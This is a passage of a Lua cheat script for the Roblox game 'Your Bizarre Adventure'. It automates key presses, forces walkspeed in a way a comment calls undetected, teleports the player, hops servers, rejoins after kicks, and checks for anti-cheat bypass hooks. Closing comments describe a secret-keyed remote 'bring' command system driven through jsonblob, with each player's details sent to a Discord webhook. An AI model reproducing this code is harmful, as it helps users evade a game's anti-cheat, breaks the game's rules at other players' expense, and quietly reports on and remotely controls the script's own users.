        getgenv().VIM:SendKeyEvent(true, Enum.KeyCode.L, false, game)
        getgenv().holdingL = true
    end

    getgenv().releaseL = function()
        if not getgenv().holdingL then return end
        getgenv().VIM:SendKeyEvent(false, Enum.KeyCode.L, false, game)
        getgenv().holdingL = false
    end

    MiscTab:Toggle({
        Flag = "HamonCharge",
        Title = "Auto Hamon Charge",
        Default = false,
        Callback = function(state)
            getgenv().AutoHamonCharge = state
            getgenv().AutoHamonChargeToken = getgenv().AutoHamonChargeToken + 1
            getgenv().AutoHamonChargeThreadToken = getgenv().AutoHamonChargeToken

            if state then
                getgenv().forceHamonBindL()
                getgenv().HamonLastBind = tick()
                notify("YBA Script", "Auto Hamon Charge enabled. Charging to max every 7.5s.")
                task.spawn(function()
                    while getgenv().AutoHamonCharge and getgenv().AutoHamonChargeThreadToken == getgenv().AutoHamonChargeToken do
                        if game.Players.LocalPlayer.Character
                            and game.Players.LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid")
                            and game.Players.LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid").Health > 0 then

                            if tick() - getgenv().HamonLastBind >= 10 then
                                getgenv().forceHamonBindL()
                                getgenv().HamonLastBind = tick()
                            end

                            getgenv().holdL()
                            task.wait(getgenv().HamonHoldDuration)
                            getgenv().releaseL()
                            task.wait(getgenv().HamonChargeInterval)
                        else
                            getgenv().releaseL()
                            task.wait(0.25)
                        end
                    end
                    getgenv().releaseL()
                end)
            else
                getgenv().releaseL()
                notify("YBA Script", "Auto Hamon Charge disabled.")
            end
        end,
    })
end
MiscTab:Section({
    Title = "Walkspeed Modifier",
})
MiscTab:Slider({
    Flag = "WalkspeedModifier",
    Title = "Walkspeed Modifier",
    Step = 1,
    Value = {
        Min = 0,
        Max = 200,
        Default = 16
    },
    Callback = function(value)
        local player = game.Players.LocalPlayer
        
        if not player.Character then return end
        
        -- Store the speed in global scope
        getgenv().CustomWalkSpeed = value
        
        -- Disconnect old connection if exists
        if getgenv().WalkspeedConnection then
            getgenv().WalkspeedConnection:Disconnect()
        end
        
        -- Use RunService to maintain the speed without detection
        getgenv().WalkspeedConnection = game:GetService("RunService").RenderStepped:Connect(function()
            local char = player.Character
            if not char or not char.Parent then
                return
            end
            
            local hum = char:FindFirstChildWhichIsA("Humanoid")
            if hum then
                hum.WalkSpeed = getgenv().CustomWalkSpeed
            end
        end)
        
        -- Handle character respawn
        if getgenv().WalkspeedCharConnection then
            getgenv().WalkspeedCharConnection:Disconnect()
        end
        
        getgenv().WalkspeedCharConnection = player.CharacterAdded:Connect(function(newChar)
            if getgenv().CustomWalkSpeed and getgenv().CustomWalkSpeed > 0 then
                local newHum = newChar:WaitForChild("Humanoid", 5)
                if newHum then
                    newHum.WalkSpeed = getgenv().CustomWalkSpeed
                end
            end
        end)
        
        notify("YBA Script", "Walkspeed set to: " .. value)
    end
})
MiscTab:Button({
    Title = "Reset Walkspeed",
    Callback = function()
        -- Reset the speed to default
        getgenv().CustomWalkSpeed = 16
        
        -- Disconnect old connection if exists
        if getgenv().WalkspeedConnection then
            getgenv().WalkspeedConnection:Disconnect()
            getgenv().WalkspeedConnection = nil
        end
        
        -- Reset the current humanoid's walkspeed if character exists
        local player = game.Players.LocalPlayer
        if player.Character then
            local hum = player.Character:FindFirstChildWhichIsA("Humanoid")
            if hum then
                hum.WalkSpeed = 16
            end
        end
        
        notify("YBA Script", "Walkspeed reset to default (16)")
    end
})

-- Combat Log and Healing Pose features removed to reduce file size
-- Please load these features from a separate module file

DevSection:Button({
    Title = "Save Current Location",
    Callback = function()
        local player = game.Players.LocalPlayer
        local character = player.Character
        
        if not character or not character:FindFirstChild("HumanoidRootPart") then
            notify("YBA Script", "Character not found!")
            return
        end
        
        local hrp = character.HumanoidRootPart
        getgenv().PussyModeOriginalLocation = hrp.Position
        
        notify("YBA Script", "Location saved! X: " .. math.floor(hrp.Position.X) .. " Y: " .. math.floor(hrp.Position.Y) .. " Z: " .. math.floor(hrp.Position.Z))
    end
})
DevSection:Button({
    Title = "Jump Back In to spawn (SBR)",
    Callback = function()
        local player = game.Players.LocalPlayer
        local character = player.Character
        
        if not character or not character:FindFirstChild("HumanoidRootPart") then
            notify("YBA Script", "Character not found!")
            return
        end
        
        local hrp = character.HumanoidRootPart
        local targetLocation = Vector3.new(-1320.08, 276.34, 1322.95)
        
        -- Cleanup any physics objects
        for _, child in pairs(hrp:GetChildren()) do
            if child:IsA("BodyPosition") or child:IsA("BodyGyro") or child:IsA("BodyVelocity") then
                child:Destroy()
            end
        end
        
        hrp.CFrame = CFrame.new(targetLocation)
        hrp.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
        hrp.Velocity = Vector3.new(0, 0, 0)
        
        notify("YBA Script", "Jumped back to spawn!")
    end
})

MiscTab:Section({
    Title = "Server Hop",
})
MiscTab:Button({
    Title = "Server Hop",
    Callback = function()
        notify("YBA Script", "Hopping server...")
        task.wait(1)
        game:GetService("TeleportService"):Teleport(game.PlaceId, game.Players.LocalPlayer)
    end
})
FarmingTab:Section({
    Title = "Auto Rejoin on kick",
})

FarmingTab:Toggle({
    Flag = "AutoRejoinOnKick",
    Title = "Auto Rejoin on Kick",
    Default = false,
    Locked = false,
    Callback = function(value)
        if value then
            notify("YBA Script", "Auto Rejoin on Kick enabled.")
            local TeleportService = game:GetService("TeleportService")
            spawn(function()
                while true do
                    wait(1)
                    pcall(function()
                        local coreGui = game:GetService("CoreGui")
                        local prompt = coreGui:FindFirstChild("RobloxPromptGui")
                        if prompt then
                            local overlay = prompt:FindFirstChild("promptOverlay")
                            if overlay then
                                local errorPrompt = overlay:FindFirstChild("ErrorPrompt")
                                if errorPrompt and errorPrompt.Visible then
                                    local titleFrame = errorPrompt:FindFirstChild("TitleFrame")
                                    if titleFrame then
                                        local errorTitle = titleFrame:FindFirstChild("ErrorTitle")
                                        if errorTitle and (string.lower(errorTitle.Text):find("disconnect") or string.lower(errorTitle.Text):find("kicked")) then
                                            notify("YBA Script", "Detected kick/disconnect. Rejoining the server...")
                                            TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId)
                                        end
                                    end
                                end
                            end
                        end
                    end)
                end
            end)
        else
            notify("YBA Script", "Auto Rejoin on Kick disabled.")
        end
    end
})

DevSection:Button({
    Title = "Open Debug Test GUI",
    Callback = function()
        local DebugTab = Window:Tab({ Title = "Debug", Icon = "bug" })
        
        local DebugSection = DebugTab:Section({ Title = "System Information" })
        
        DebugSection:Button({
            Title = "Check Executor Support",
            Callback = function()
                local supported = false
                local ok, err = pcall(function()
                    hookmetamethod(game, "__index", function() end)
                    supported = true
                end)
                notify("Debug", supported and "✓ Executor Supported" or "✗ Executor Not Supported")
            end
        })
        
        DebugSection:Button({
            Title = "Memory Info",
            Callback = function()
                local stats = game:GetService("Stats")
                local memory = math.floor(stats.Memory.Value / 1024 / 1024)
                notify("Debug", "Memory: " .. memory .. " MB")
            end
        })
        
        DebugSection:Button({
            Title = "Network Latency",
            Callback = function()
                local stats = game:GetService("Stats")
                local ping = 0
                if stats:FindFirstChild("Network") then
                    local rep = stats.Network:FindFirstChild("ServerReplicator")
                    if rep and rep:FindFirstChild("DataPing") then
                        ping = math.round(rep.DataPing.Value * 1000)
                    end
                end
                notify("Debug", "Ping: " .. (ping > 0 and ping .. "ms" or "N/A"))
            end
        })
        
        DebugSection:Button({
            Title = "Script Connections",
            Callback = function()
                local count = #getconnections(game.Players.LocalPlayer.CharacterAdded)
                notify("Debug", "Active Connections: " .. count)
            end
        })
        
        local WorkspaceSection = DebugTab:Section({ Title = "Workspace" })
        
        WorkspaceSection:Button({
            Title = "Count Workspace Parts",
            Callback = function()
                local partCount = 0
                for _, v in pairs(workspace:GetDescendants()) do
                    if v:IsA("BasePart") then partCount = partCount + 1 end
                end
                notify("Debug", "Total Parts: " .. partCount)
            end
        })
        
        WorkspaceSection:Button({
            Title = "Player Position",
            Callback = function()
                local player = game.Players.LocalPlayer
                if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                    local pos = player.Character.HumanoidRootPart.Position
                    local posStr = string.format("X: %.2f | Y: %.2f | Z: %.2f", pos.X, pos.Y, pos.Z)
                    notify("Debug", posStr)
                end
            end
        })
        
        WorkspaceSection:Button({
            Title = "List NPCs in Living",
            Callback = function()
                local living = workspace:FindFirstChild("Living")
                if living then
                    local npcList = ""
                    for _, npc in pairs(living:GetChildren()) do
                        npcList = npcList .. npc.Name .. ", "
                    end
                    notify("Debug", "NPCs: " .. (npcList ~= "" and npcList or "None found"))
                else
                    notify("Debug", "Living folder not found")
                end
            end
        })
        
        local BypassSection = DebugTab:Section({ Title = "Bypass Status" })
        
        BypassSection:Button({
            Title = "Check Bypass Hooks",
            Callback = function()
                if getgenv().oldMagnitude and getgenv().oldNc then
                    notify("Debug", "✓ Bypass hooks are active")
                else
                    notify("Debug", "✗ Bypass hooks not found")
                end
            end
        })
        
        local ConsoleSection = DebugTab:Section({ Title = "Console" })
        
        ConsoleSection:Button({
            Title = "Print Character Structure",
            Callback = function()
                local player = game.Players.LocalPlayer
                if player.Character then
                    print("=== CHARACTER STRUCTURE ===")
                    for _, child in pairs(player.Character:GetChildren()) do
                        print(child.Name .. " (" .. child.ClassName .. ")")
                    end
                    notify("Debug", "Character printed to console")
                end
            end
        })
        
        ConsoleSection:Button({
            Title = "Print PlayerStats",
            Callback = function()
                local player = game.Players.LocalPlayer
                if player:FindFirstChild("PlayerStats") then
                    print("=== PLAYER STATS ===")
                    for _, stat in pairs(player.PlayerStats:GetChildren()) do
                        if stat:IsA("ValueBase") then
                            print(stat.Name .. ": " .. tostring(stat.Value))
                        end
                    end
                    notify("Debug", "Stats printed to console")
                end
            end
        })
        
        notify("YBA Script", "Debug tab opened!")
    end
})

FarmingTab:Section({
    Title = "Auto Server Hop, automatically server hops when items are not spawned in.",
})

FarmingTab:Toggle({
    Flag = "AutoServerHop",
    Title = "Enable Auto Server Hop (IN DEVELOPMENT)",
    Locked = true,
    Default = false,
    Callback = function(value)
        getgenv().AutoServerHopEnabled = value
        if value then
            notify("YBA Script", "Auto Server Hop enabled.")
            
            local function checkAndHopIfNeeded()
                local itemsFound = {}
                local itemSpawnsFolder = workspace:FindFirstChild("Item_Spawns")
                if not itemSpawnsFolder then return false, itemsFound end
                
                local itemsFolder = itemSpawnsFolder:FindFirstChild("Items")
                if not itemsFolder then return false, itemsFound end
                
                local hasTargetItems = false
                
                -- Fetch all items and their details
                for _, itemModel in pairs(itemsFolder:GetChildren()) do
                    local itemPart = itemModel:FindFirstChildOfClass("MeshPart") or itemModel:FindFirstChildOfClass("Part") or itemModel.PrimaryPart
                    local proxPrompt = itemModel:FindFirstChild("ProximityPrompt", true)
                    
                    if itemPart and proxPrompt and itemPart:IsA("BasePart") and itemPart.Transparency < 1 then
                        local itemName = proxPrompt.ObjectText ~= "" and proxPrompt.ObjectText or itemModel.Name
                        itemsFound[itemName] = (itemsFound[itemName] or 0) + 1
                        
                        -- Reference maxLimits from earlier in script to validate items
                        if maxLimits[itemName] or itemName == "Lucky Arrow" or itemName == "Lucky Stone Mask" or itemName == "Christmas Present" or itemName == "Gold Coin" or itemName == "Diamond" or itemName == "Mysterious Arrow" or itemName == "Rokakaka" or itemName == "Pure Rokakaka" or itemName == "Stone Mask" or itemName == "Rib Cage of The Saint's Corpse" or itemName == "Steel Ball" or itemName == "Ancient Scroll" or itemName == "Dio's Diary" or itemName == "Caesar's Headband" or itemName == "Quinton's Glove" or itemName == "Blue Candy" or itemName == "Red Candy" or itemName == "Green Candy" or itemName == "Yellow Candy" or itemName == "Gold Umbrella" or itemName == "Zepellin's Headband" or itemName == "Zeppeli's Hat" or itemName == "Clackers" then
                            hasTargetItems = true
                        end
                    end
                end
                
                -- Also check if Lucky Arrow exists (special item)
                if itemsFound["Lucky Arrow"] or itemsFound["Lucky Stone Mask"] then
                    hasTargetItems = true
                end
                
                return hasTargetItems, itemsFound
            end
            
            -- Check immediately on startup only if item farm is enabled
            if normalFarmOn or afkFarmOn or safePlaceFarmOn then
                local hasItems, foundItems = checkAndHopIfNeeded()
                if not hasItems then
                    WindUI:Notify({
                        Title = "YBA Script",
                        Content = "No items spawned at startup, hopping server...",
                        Icon = "refresh-cw",
                        Duration = 3
                    })
                    task.wait(1)
                    game:GetService("TeleportService"):Teleport(game.PlaceId, game.Players.LocalPlayer)
                    return
                end
            end
            
            -- Continue periodic checks only while item farm is running
            task.spawn(function()
                local lastHopTime = 0
                local hopCooldown = 30 -- Prevent spam hopping
                
                while getgenv().AutoServerHopEnabled do
                    task.wait(8)
                    
                    if normalFarmOn or afkFarmOn or safePlaceFarmOn then
                        local hasItems, foundItems = checkAndHopIfNeeded()
                        
                        if not hasItems then
                            local currentTime = tick()
                            if currentTime - lastHopTime >= hopCooldown then
                                lastHopTime = currentTime
                                
                                local itemList = ""
                                for itemName, count in pairs(foundItems or {}) do
                                    itemList = itemList .. itemName .. "x" .. count .. ", "
                                end
                                
                                WindUI:Notify({
                                    Title = "YBA Script",
                                    Content = "No target items found. Found: " .. (itemList ~= "" and itemList or "nothing") .. " Hopping...",
                                    Icon = "refresh-cw",
                                    Duration = 3
                                })
                                
                                task.wait(1)
                                game:GetService("TeleportService"):Teleport(game.PlaceId, game.Players.LocalPlayer)
                                break
                            end
                        else
                            lastHopTime = 0 -- Reset cooldown if items found
                        end
                    end
                end
            end)
        else
            notify("YBA Script", "Auto Server Hop disabled.")
        end
    end
})




LoadStandFarmFeatures()

-- Bring command is handled via the jsonblob remote command system above.
-- Owner sends: fetch with {command:'bring', secret:'...', target:'<user_id>', owner:'<owner_id>'}
-- The Quick Bring fetch template is printed in each player's Discord webhook embed.
